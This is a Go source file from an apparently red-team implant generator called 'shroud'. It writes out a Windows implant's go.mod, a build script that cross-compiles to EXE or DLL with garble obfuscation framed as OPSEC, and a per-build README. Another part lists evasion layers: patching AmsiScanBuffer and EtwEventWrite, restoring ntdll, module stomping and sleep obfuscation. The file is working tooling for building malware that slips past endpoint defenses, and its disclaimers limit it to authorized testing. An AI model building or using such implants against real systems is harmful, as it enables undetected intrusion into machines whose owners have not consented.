// projectfiles.go — emits the implant project's go.mod, go.sum, build.sh, README.
package payload

import (
	"fmt"
	"strings"
)

// goMod returns the implant's go.mod. The implant module is a leaf module so
// it builds standalone after `go mod tidy`.
func (b *Builder) goMod() string {
	var sb strings.Builder
	sb.WriteString("module shroud-implant\n\n")
	sb.WriteString("go 1.23\n\n")
	sb.WriteString("require (\n")
	sb.WriteString("\tgithub.com/carved4/go-wincall v1.3.2\n")
	sb.WriteString(")\n")
	return sb.String()
}

// goSum returns an empty go.sum. go.sum has no comment syntax (unlike go.mod),
// so a seed comment would be malformed; build.sh runs `go mod tidy` which
// populates go.sum with the real hashes.
func (b *Builder) goSum() string {
	return ""
}

// buildSh emits the cross-compile script. CGO_ENABLED=0 + GOOS=windows keeps
// the implant pure-Go (no mingw). Optional garble for OPSEC. For format=dll it
// uses -buildmode=c-shared (payload fires from init() on DLL load).
func (b *Builder) buildSh() string {
	garble := b.Spec.Garble
	tiny := b.Spec.Tiny
	dll := b.Spec.Format == "dll"
	out := "implant.exe"
	buildmode := ""
	ldflags := "-w -s -H=windowsgui"
	if dll {
		out = "implant.dll"
		buildmode = "-buildmode=c-shared"
		ldflags = "-w -s" // no windowsgui for a DLL
	}
	var sb strings.Builder
	sb.WriteString("#!/usr/bin/env bash\n")
	sb.WriteString("# build.sh — cross-compile the shroud implant to a Windows PE/DLL. Generated by shroud.\n")
	sb.WriteString("# The generator never runs this automatically; run it to produce the binary.\n")
	sb.WriteString("set -euo pipefail\n")
	sb.WriteString("cd \"$(dirname \"$0\")\"\n\n")
	if dll {
		// c-shared buildmode needs a C linker for the DLL stub -> CGO + mingw.
		// The EXE format stays pure-Go (CGO_ENABLED=0); only the DLL needs this.
		sb.WriteString("# DLL (c-shared) requires CGO + a Windows C cross-compiler.\n")
		sb.WriteString("export CGO_ENABLED=1 GOOS=windows GOARCH=amd64\n")
		sb.WriteString("export CC=${CC:-x86_64-w64-mingw32-gcc}\n")
		sb.WriteString("command -v \"$CC\" >/dev/null 2>&1 || { echo \"[!] $CC not found (apt install mingw-w64)\" >&2; exit 1; }\n")
	} else {
		sb.WriteString("# EXE: pure Go, no mingw.\n")
		sb.WriteString("export CGO_ENABLED=0 GOOS=windows GOARCH=amd64\n")
	}
	sb.WriteString(fmt.Sprintf("LDFLAGS=%q\n", ldflags))
	sb.WriteString(fmt.Sprintf("OUT=%q\n", out))
	if buildmode != "" {
		sb.WriteString(fmt.Sprintf("BUILDMODE=%q\n", buildmode))
	} else {
		sb.WriteString("BUILDMODE=\"\"\n")
	}
	sb.WriteString("\n")
	sb.WriteString("# resolve deps + populate go.sum, then build.\n")
	sb.WriteString("go mod tidy\n")
	if garble {
		// garble v0.17+ syntax: garble flags (-literals, -tiny) go BEFORE the
		// `build` subcommand; go-build flags (-trimpath, -buildvcs, -ldflags,
		// -buildmode, -o) go AFTER.
		garbleFlags := "-literals"
		if tiny {
			garbleFlags = "-literals -tiny"
		}
		sb.WriteString("# OPSEC: garble obfuscates Go identifiers + string literals; -trimpath/-buildvcs=false drop build-path fingerprints.\n")
		sb.WriteString("if command -v garble >/dev/null 2>&1; then\n")
		sb.WriteString(fmt.Sprintf("  garble %s build $BUILDMODE -trimpath -buildvcs=false -ldflags=\"$LDFLAGS\" -o $OUT .\n", garbleFlags))
		sb.WriteString("else\n")
		sb.WriteString("  echo \"[!] garble not found; falling back to plain go build (go install mvdan.cc/garble@latest)\" >&2\n")
		sb.WriteString("  go build $BUILDMODE -trimpath -buildvcs=false -ldflags=\"$LDFLAGS\" -o $OUT .\n")
		sb.WriteString("fi\n")
	} else {
		sb.WriteString("go build $BUILDMODE -trimpath -buildvcs=false -ldflags=\"$LDFLAGS\" -o $OUT .\n")
	}
	sb.WriteString(fmt.Sprintf("\necho \"[+] built %s ($(wc -c < %s) bytes)\"\n", out, out))
	return sb.String()
}

// readme emits a per-build README documenting the technique, layers, and build.
func (b *Builder) readme() string {
	var sb strings.Builder
	sb.WriteString("# shroud implant — " + b.Spec.Tech.ID + " " + b.Spec.Tech.Name + "\n\n")
	sb.WriteString("Generated by **shroud** (Go rewrite). Authorized red-team use only.\n\n")
	sb.WriteString("## Technique\n\n")
	sb.WriteString(b.Spec.Tech.Summary + "\n\n")
	sb.WriteString("**Flow:**\n\n")
	for _, f := range b.Spec.Tech.Flow {
		sb.WriteString("- " + f + "\n")
	}
	sb.WriteString("\n## Evasion stack (`-e`)\n\n")
	if len(b.Spec.Layers) == 0 {
		sb.WriteString("_none_\n")
	} else {
		for _, l := range b.Spec.Layers {
			sb.WriteString(fmt.Sprintf("- `%s` — %s\n", l, layerHelp(string(l))))
		}
	}
	sb.WriteString("\n## Build\n\n")
	sb.WriteString("```bash\n")
	sb.WriteString("go mod tidy && ./build.sh   # -> implant.exe (Windows x64, pure Go, no mingw)\n")
	sb.WriteString("```\n\n")
	sb.WriteString("Run `implant.exe` only against systems you own or are explicitly authorized to test.\n")
	return sb.String()
}

// layerHelp is a short description; mirrored from evasion.Help to avoid an
// import (and kept in sync manually).
func layerHelp(l string) string {
	m := map[string]string{
		"dynamic-api": "PEB-walk + DJB2 hash resolution (clean IAT)",
		"aes":        "AES-256-CBC decrypt-at-rest (stdlib crypto/aes)",
		"rc4":        "RC4 decrypt-at-rest",
		"xor":        "XOR decrypt-at-rest",
		"amsi":       "patches AmsiScanBuffer (C3-free 58 FF E0)",
		"etw":        "patches ntdll!EtwEventWrite",
		"unhook":     "restores ntdll .text (KnownDlls path in this build)",
		"unhook-kd":  "restores ntdll .text from \\KnownDlls\\ntdll.dll",
		"stomp":      "module-stomp payload into a legit DLL's .text",
		"callbacks":  "CreateTimerQueueTimer instead of CreateThread",
		"sleep":      "Ekko/Foliage sleep (Phase 2)",
	}
	if v, ok := m[l]; ok {
		return v
	}
	return "(planned)"
}